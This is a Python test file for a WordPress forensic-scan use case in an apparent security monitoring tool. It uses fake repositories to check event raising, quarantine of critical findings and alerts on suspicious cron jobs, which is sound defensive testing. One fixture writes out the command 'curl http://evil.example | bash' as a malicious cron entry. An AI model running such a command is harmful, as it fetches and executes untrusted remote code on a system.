from __future__ import annotations

from uuid import UUID, uuid4

from sentinel.application.wordpress.forensic.use_cases import RunWordPressForensicScanUseCase
from sentinel.domain.discovery.entities import CpanelAccount, WordPressInstallation
from sentinel.domain.discovery.value_objects import LinuxUsername
from sentinel.domain.events.entities import SecurityEvent
from sentinel.domain.integrity.entities import IntegrityFinding
from sentinel.domain.shared.entity import utcnow
from sentinel.domain.shared.value_objects import AbsoluteFilePath, DomainName, Severity
from sentinel.domain.wordpress.forensic.value_objects import WordPressForensicFinding
from sentinel.domain.wordpress.inventory.entities import WordPressCronJob


class FakeCpanelAccountRepository:
    def __init__(self, accounts: list[CpanelAccount]) -> None:
        self.by_id: dict[UUID, CpanelAccount] = {a.id: a for a in accounts}

    async def add(self, entity: CpanelAccount) -> None:
        self.by_id[entity.id] = entity

    async def save(self, entity: CpanelAccount) -> None:
        self.by_id[entity.id] = entity

    async def get(self, entity_id: UUID) -> CpanelAccount | None:
        return self.by_id.get(entity_id)

    async def list(self, *, limit: int = 50, offset: int = 0) -> list[CpanelAccount]:
        return list(self.by_id.values())[offset : offset + limit]

    async def get_by_username(self, username: LinuxUsername) -> CpanelAccount | None:
        return next((a for a in self.by_id.values() if a.username == username), None)

    async def list_by_server(self, server_id: UUID) -> list[CpanelAccount]:
        return [a for a in self.by_id.values() if a.server_id == server_id]


class FakeIntegrityFindingRepository:
    def __init__(self) -> None:
        self.by_id: dict[UUID, IntegrityFinding] = {}

    async def add(self, entity: IntegrityFinding) -> None:
        self.by_id[entity.id] = entity

    async def save(self, entity: IntegrityFinding) -> None:
        self.by_id[entity.id] = entity

    async def get(self, entity_id: UUID) -> IntegrityFinding | None:
        return self.by_id.get(entity_id)

    async def list(self, *, limit: int = 50, offset: int = 0) -> list[IntegrityFinding]:
        return list(self.by_id.values())[offset : offset + limit]

    async def list_unacknowledged(
        self, *, limit: int = 50, offset: int = 0
    ) -> list[IntegrityFinding]:
        return [f for f in self.by_id.values() if not f.is_acknowledged][offset : offset + limit]

    async def count_total(self) -> int:
        return len(self.by_id)

    async def list_since(self, since, *, limit: int = 500) -> list[IntegrityFinding]:  # type: ignore[no-untyped-def]
        return [f for f in self.by_id.values() if f.detected_at >= since][:limit]

    async def list_by_remediation_state(self, state, *, limit: int = 200) -> list[IntegrityFinding]:  # type: ignore[no-untyped-def]
        return [f for f in self.by_id.values() if f.remediation_state == state][:limit]

    async def list_critical_unremediated(
        self,
        since,
        *,
        limit: int = 500,  # type: ignore[no-untyped-def]
    ) -> list[IntegrityFinding]:
        return [
            f
            for f in self.by_id.values()
            if f.severity == Severity.CRITICAL
            and f.remediation_state.value == "NONE"
            and f.detected_at >= since
        ][:limit]


class FakeWordPressInstallationRepository:
    def __init__(self, installations: list[WordPressInstallation]) -> None:
        self.by_id: dict[UUID, WordPressInstallation] = {i.id: i for i in installations}

    async def add(self, entity: WordPressInstallation) -> None:
        self.by_id[entity.id] = entity

    async def save(self, entity: WordPressInstallation) -> None:
        self.by_id[entity.id] = entity

    async def get(self, entity_id: UUID) -> WordPressInstallation | None:
        return self.by_id.get(entity_id)

    async def list(self, *, limit: int = 50, offset: int = 0) -> list[WordPressInstallation]:
        return list(self.by_id.values())[offset : offset + limit]

    async def get_by_path(self, absolute_path: str) -> WordPressInstallation | None:
        return next((i for i in self.by_id.values() if str(i.absolute_path) == absolute_path), None)

    async def list_by_account(self, cpanel_account_id: UUID) -> list[WordPressInstallation]:
        return [i for i in self.by_id.values() if i.cpanel_account_id == cpanel_account_id]


class FakeWordPressCronJobRepository:
    def __init__(self, jobs: list[WordPressCronJob] | None = None) -> None:
        self.by_id: dict[UUID, WordPressCronJob] = {j.id: j for j in jobs or []}

    async def add(self, entity: WordPressCronJob) -> None:
        self.by_id[entity.id] = entity

    async def save(self, entity: WordPressCronJob) -> None:
        self.by_id[entity.id] = entity

    async def get(self, entity_id: UUID) -> WordPressCronJob | None:
        return self.by_id.get(entity_id)

    async def list(self, *, limit: int = 50, offset: int = 0) -> list[WordPressCronJob]:
        return list(self.by_id.values())[offset : offset + limit]

    async def list_by_installation(self, installation_id: UUID) -> list[WordPressCronJob]:
        return [j for j in self.by_id.values() if j.installation_id == installation_id]

    async def get_by_installation_and_command(
        self, installation_id: UUID, command: str
    ) -> WordPressCronJob | None:
        return next(
            (
                j
                for j in self.by_id.values()
                if j.installation_id == installation_id and j.command == command
            ),
            None,
        )


class FakeSecurityEventRepository:
    def __init__(self) -> None:
        self.by_id: dict[UUID, SecurityEvent] = {}

    async def add(self, entity: SecurityEvent) -> None:
        self.by_id[entity.id] = entity

    async def save(self, entity: SecurityEvent) -> None:
        self.by_id[entity.id] = entity

    async def get(self, entity_id: UUID) -> SecurityEvent | None:
        return self.by_id.get(entity_id)

    async def list(self, *, limit: int = 50, offset: int = 0) -> list[SecurityEvent]:
        return list(self.by_id.values())[offset : offset + limit]

    async def list_unprocessed(self, *, limit: int = 200) -> list[SecurityEvent]:
        return [e for e in self.by_id.values() if e.processed_at is None][:limit]

    async def count_total(self) -> int:
        return len(self.by_id)

    async def count_unprocessed(self) -> int:
        return len([e for e in self.by_id.values() if e.processed_at is None])

    async def list_by_account(self, account_id: UUID, *, limit: int = 200) -> list[SecurityEvent]:
        return [e for e in self.by_id.values() if e.account_id == account_id][:limit]


class FakeForensicScanner:
    def __init__(self, findings: list[WordPressForensicFinding]) -> None:
        self._findings = findings

    async def scan(self, installation: WordPressInstallation) -> list[WordPressForensicFinding]:
        return list(self._findings)


def _installation(account_id: UUID, *, home: str = "/home/examplebob1") -> WordPressInstallation:
    return WordPressInstallation(
        cpanel_account_id=account_id,
        absolute_path=AbsoluteFilePath(value=f"{home}/public_html"),
        domain=DomainName(value="example.com"),
        wp_version="6.5",
        is_multisite=False,
        last_seen_at=utcnow(),
    )


def _account(account_id: UUID, *, home: str = "/home/examplebob1") -> CpanelAccount:
    return CpanelAccount(
        id=account_id,
        server_id=uuid4(),
        username=LinuxUsername(value="examplebob1"),
        primary_domain=DomainName(value="example.com"),
        home_directory=AbsoluteFilePath(value=home),
        is_suspended=False,
        is_active=True,
        last_seen_at=utcnow(),
    )


async def test_forensic_scan_raises_event_per_finding() -> None:
    account_id = uuid4()
    installation = _installation(account_id)
    finding = WordPressForensicFinding(
        finding_type="fake_plugin",
        relative_path="wp-content/plugins/totally-legit",
        description="no valid plugin header",
        severity=Severity.HIGH,
        matched_rule_ids=("rce-user-input",),
    )

    use_case = RunWordPressForensicScanUseCase(
        installation_repository=FakeWordPressInstallationRepository([installation]),
        account_repository=FakeCpanelAccountRepository([_account(account_id)]),
        cron_job_repository=FakeWordPressCronJobRepository(),
        event_repository=(events := FakeSecurityEventRepository()),
        finding_repository=FakeIntegrityFindingRepository(),
        scanner=FakeForensicScanner([finding]),
    )

    result = await use_case.execute()

    assert result.installations_scanned == 1
    assert result.findings_raised == 1
    (event,) = events.by_id.values()
    assert event.event_type == "wordpress_fake_plugin"
    assert event.source_context == "wordpress"
    assert event.account_id == account_id
    assert event.severity == Severity.HIGH
    assert event.file_path == "wp-content/plugins/totally-legit"
    assert event.detection_rule_id == "rce-user-input"


async def test_forensic_scan_materializes_integrity_finding_for_critical() -> None:
    """A CRITICAL forensic finding (a malware-scanner match, not just a
    missing header) must become a real, quarantinable ``IntegrityFinding``
    — re-anchored from the WP install root onto the account's home
    directory — so ``AutoQuarantineCriticalFindingsUseCase`` can act on
    it."""
    account_id = uuid4()
    installation = _installation(account_id, home="/home/examplebob1")
    finding = WordPressForensicFinding(
        finding_type="dropin_present",
        relative_path="wp-content/db.php",
        description="malicious db.php",
        severity=Severity.CRITICAL,
        matched_rule_ids=("webshell-signature",),
        sha256="a" * 64,
    )
    findings = FakeIntegrityFindingRepository()

    use_case = RunWordPressForensicScanUseCase(
        installation_repository=FakeWordPressInstallationRepository([installation]),
        account_repository=FakeCpanelAccountRepository([_account(account_id)]),
        cron_job_repository=FakeWordPressCronJobRepository(),
        event_repository=FakeSecurityEventRepository(),
        finding_repository=findings,
        scanner=FakeForensicScanner([finding]),
    )

    await use_case.execute()

    (integrity_finding,) = findings.by_id.values()
    assert integrity_finding.account_id == account_id
    assert str(integrity_finding.relative_path) == "public_html/wp-content/db.php"
    assert integrity_finding.severity == Severity.CRITICAL
    assert str(integrity_finding.current_sha256) == "a" * 64
    assert integrity_finding.remediation_state.value == "NONE"


async def test_forensic_scan_skips_materialization_when_install_outside_account_home() -> None:
    """A discovery-layer inconsistency (the WP install path isn't actually
    under its own account's home directory) must not crash the scan — it's
    logged and skipped, not papered over with a bogus relative path."""
    account_id = uuid4()
    installation = _installation(account_id, home="/home/examplebob1")
    finding = WordPressForensicFinding(
        finding_type="dropin_present",
        relative_path="wp-content/db.php",
        description="malicious db.php",
        severity=Severity.CRITICAL,
        matched_rule_ids=("webshell-signature",),
        sha256="a" * 64,
    )
    findings = FakeIntegrityFindingRepository()

    use_case = RunWordPressForensicScanUseCase(
        installation_repository=FakeWordPressInstallationRepository([installation]),
        account_repository=FakeCpanelAccountRepository(
            [_account(account_id, home="/home/someone-else")]
        ),
        cron_job_repository=FakeWordPressCronJobRepository(),
        event_repository=FakeSecurityEventRepository(),
        finding_repository=findings,
        scanner=FakeForensicScanner([finding]),
    )

    result = await use_case.execute()

    assert result.findings_raised == 1
    assert findings.by_id == {}


async def test_forensic_scan_high_severity_finding_is_not_materialized() -> None:
    account_id = uuid4()
    installation = _installation(account_id)
    finding = WordPressForensicFinding(
        finding_type="fake_theme",
        relative_path="wp-content/themes/fake",
        description="no valid theme header",
        severity=Severity.HIGH,
    )
    findings = FakeIntegrityFindingRepository()

    use_case = RunWordPressForensicScanUseCase(
        installation_repository=FakeWordPressInstallationRepository([installation]),
        account_repository=FakeCpanelAccountRepository([_account(account_id)]),
        cron_job_repository=FakeWordPressCronJobRepository(),
        event_repository=FakeSecurityEventRepository(),
        finding_repository=findings,
        scanner=FakeForensicScanner([finding]),
    )

    await use_case.execute()

    assert findings.by_id == {}


async def test_forensic_scan_alerts_on_suspicious_cron_jobs() -> None:
    account_id = uuid4()
    installation = _installation(account_id)
    cron_job = WordPressCronJob(
        installation_id=installation.id,
        command="curl http://evil.example | bash",
        schedule_raw="* * * * *",
        is_suspicious=True,
        flag_reason="command contains suspicious pattern: 'curl '",
        last_seen_at=utcnow(),
    )

    use_case = RunWordPressForensicScanUseCase(
        installation_repository=FakeWordPressInstallationRepository([installation]),
        account_repository=FakeCpanelAccountRepository([_account(account_id)]),
        cron_job_repository=FakeWordPressCronJobRepository([cron_job]),
        event_repository=(events := FakeSecurityEventRepository()),
        finding_repository=FakeIntegrityFindingRepository(),
        scanner=FakeForensicScanner([]),
    )

    result = await use_case.execute()

    assert result.suspicious_cron_alerts == 1
    (event,) = events.by_id.values()
    assert event.event_type == "wordpress_suspicious_cron"
    assert event.account_id == account_id
    assert event.payload["command"] == cron_job.command


async def test_forensic_scan_ignores_non_suspicious_cron_jobs() -> None:
    account_id = uuid4()
    installation = _installation(account_id)
    cron_job = WordPressCronJob(
        installation_id=installation.id,
        command="/usr/bin/php /home/bob/wp-cron.php",
        schedule_raw="* * * * *",
        is_suspicious=False,
        last_seen_at=utcnow(),
    )

    use_case = RunWordPressForensicScanUseCase(
        installation_repository=FakeWordPressInstallationRepository([installation]),
        account_repository=FakeCpanelAccountRepository([_account(account_id)]),
        cron_job_repository=FakeWordPressCronJobRepository([cron_job]),
        event_repository=FakeSecurityEventRepository(),
        finding_repository=FakeIntegrityFindingRepository(),
        scanner=FakeForensicScanner([]),
    )

    result = await use_case.execute()

    assert result.suspicious_cron_alerts == 0


async def test_forensic_scan_skips_inactive_installations() -> None:
    account_id = uuid4()
    installation = _installation(account_id)
    installation.is_active = False

    use_case = RunWordPressForensicScanUseCase(
        installation_repository=FakeWordPressInstallationRepository([installation]),
        account_repository=FakeCpanelAccountRepository([_account(account_id)]),
        cron_job_repository=FakeWordPressCronJobRepository(),
        event_repository=FakeSecurityEventRepository(),
        finding_repository=FakeIntegrityFindingRepository(),
        scanner=FakeForensicScanner(
            [
                WordPressForensicFinding(
                    finding_type="fake_theme",
                    relative_path="wp-content/themes/fake",
                    description="no valid theme header",
                    severity=Severity.HIGH,
                )
            ]
        ),
    )

    result = await use_case.execute()

    assert result.installations_scanned == 0
    assert result.findings_raised == 0
